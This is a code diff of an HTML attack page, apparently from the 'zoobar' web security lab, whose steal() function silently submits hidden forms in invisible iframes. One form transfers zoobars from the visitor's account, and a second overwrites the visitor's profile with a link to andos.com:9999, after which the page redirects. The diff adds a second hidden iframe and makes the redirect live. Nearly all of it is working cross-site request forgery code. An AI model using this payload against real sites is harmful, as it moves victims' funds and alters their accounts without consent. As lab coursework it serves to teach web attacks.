@@ -8,7 +8,6 @@
       for(var t = Date.now();Date.now() - t <= d;);
     }
     function steal(){
-        var url = document.URL;
         var ifr = $('#steal');
         var form = $('<form method="POST" id="transferform" action="http://andos.com/myzoo/transfer.php"></form>');
         var ip1 = $('<input name=zoobars type=text value="1" size=5>');
@@ -20,17 +19,18 @@
         ifr.append(form);
         form.attr("t"+"arget", "steal");
         form.submit();
+        var ifr1 = $('#steal1');
         var form1 = $('<form method="POST" name=profileform action="http://andos.com/myzoo/index.php">');
         var textare = $('<textarea name="profile_update"></textarea>');
         textare.html('<a href="http://andos.com:9999">美女</a>');
         var ip4 = $('<input type=text name="profile_submit" value="Save">')
         form1.append(textare);
         form1.append(ip4);
-        ifr.append(form1);
-        form1.attr("t"+"arget", "steal");
+        ifr1.append(form1);
+        form1.attr("t"+"arget", "steal1");
         form1.submit();
-        // alert("sss");
-        // location.href = "http://andos.com/myzoo";
+        alert("sss");
+        location.href = "http://andos.com/myzoo/users.php";
     }
     </script>
 </head>
@@ -38,7 +38,7 @@
     <p>hello world;</p>
     <iframe id="steal" style="display:none">
     </iframe>
-    <script>
-    </script>
+    <iframe id="steal1" style="display:none">
+    </iframe>
 </body>
 </html>
